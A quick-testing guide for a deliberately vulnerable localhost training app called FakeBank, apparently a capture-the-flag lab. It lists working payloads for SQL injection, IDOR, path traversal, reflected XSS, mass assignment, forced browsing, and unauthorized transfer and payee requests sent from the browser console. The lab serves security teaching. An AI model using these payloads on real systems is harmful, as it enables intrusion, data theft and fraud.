# Quick Testing Guide

## Start the Application

### Terminal 1 - Backend
```bash
cd backend
node server.js
```

You should see:
```
Server running on port 5000
Connected to MySQL (owasp_app)
Connected to MySQL (security_lab)
```

### Terminal 2 - Frontend
```bash
npm start
```

Then it will open at `http://localhost:3001` (or 3000 if available)

## Test Each Vulnerability

### 1. **SQL Injection** ✅
- Go to FakeBank login
- Username: `admin' OR '1'='1`
- Password: anything
- **Expected**: Popup appears + flag in Flags page

### 2. **IDOR - Account** ✅
- Login with valid credentials
- Go to Flags page first (it's empty)
- In address bar: `http://localhost:3001/fakebank` (for other user, change URL later)
- Open DevTools Console, run: 
  ```javascript
  fetch('http://localhost:5000/account/99', {
    headers: { 'Authorization': localStorage.getItem('token') }
  }).then(r => r.json()).then(console.log)
  ```
- Try user ID 99 or 2 (if you're user 1)
- **Expected**: Popup + flag in Flags page

### 3. **IDOR - Transactions** ✅
- Use console:
  ```javascript
  fetch('http://localhost:5000/transactions/99', {
    headers: { 'Authorization': localStorage.getItem('token') }
  }).then(r => r.json()).then(console.log)
  ```
- **Expected**: Popup + flag appears

### 4. **Path Traversal** ✅
- In address bar, visit:
  ```
  http://localhost:5000/download?file=../../backend/server.js
  ```
- **Expected**: Gets file + popup appears + flag shows in Flags page

### 5. **Forced Browsing** ✅
- Visit:
  ```
  http://localhost:5000/admin/export-users
  ```
- **Expected**: Popup + list of users + flag captured

### 6. **Secret Leak** ✅
- Visit:
  ```
  http://localhost:5000/config
  ```
- **Expected**: API keys shown + popup + flag captured

### 7. **Reflected XSS** ✅
- Visit:
  ```
  http://localhost:5000/search?q=<script>alert('xss')</script>
  ```
- **Expected**: Popup appears (in some cases user gets redirected back)

### 8. **Insecure Headers** ✅
- Visit:
  ```
  http://localhost:5000/headers-test
  ```
- **Expected**: Popup + flag

### 9. **Missing Auth Check** ✅
- Use console:
  ```javascript
  fetch('http://localhost:5000/admin/delete-user', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'Authorization': localStorage.getItem('token')
    },
    body: JSON.stringify({ user_id: 2 })
  }).then(r => r.json()).then(console.log)
  ```
- **Expected**: User deleted + popup + flag

### 10. **Mass Assignment** ✅
- Use console:
  ```javascript
  fetch('http://localhost:5000/profile/update', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'Authorization': localStorage.getItem('token')
    },
    body: JSON.stringify({ admin: true })
  }).then(r => r.json()).then(console.log)
  ```
- **Expected**: Profile updated + popup + flag

### 11. **Unauthorized Transfer** ✅
- Use console:
  ```javascript
  fetch('http://localhost:5000/transfer-exploit', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'Authorization': localStorage.getItem('token')
    },
    body: JSON.stringify({ from_user: 99, to_user: 1, amount: 1000 })
  }).then(r => r.json()).then(console.log)
  ```
- **Expected**: Transfer executed + popup + flag

### 12. **Unauthorized Payee Add** ✅
- Use console:
  ```javascript
  fetch('http://localhost:5000/payee-exploit', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'Authorization': localStorage.getItem('token')
    },
    body: JSON.stringify({ 
      user_id: 99, 
      payee_name: 'Hacker', 
      payee_account: '0000000000' 
    })
  }).then(r => r.json()).then(console.log)
  ```
- **Expected**: Payee added to other user + popup + flag

## View Your Flags

After exploiting vulnerabilities:
1. Go to FakeBank dashboard  
2. Click the 🚩 Flags icon in the sidebar
3. All captured flags should appear in a table

## If Popups Don't Appear

1. Check browser console for errors (F12 → Console)
2. Make sure SSE connection is active:
   ```javascript
   // In console, check if this works:
   const es = new EventSource('http://localhost:5000/vuln-events');
   es.onmessage = (e) => console.log('SSE:', e.data);
   ```
3. Verify backend is running (check port 5000)
4. Refresh the page and try again

## Flag Format

Each flag looks like:
```
FLAG{a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6}
```

- Type: Vulnerability type (SQLI, IDOR_ACCOUNT, etc.)
- Flag: Generated SHA256 hash unique per exploitation

Enjoy the lab! 🎉
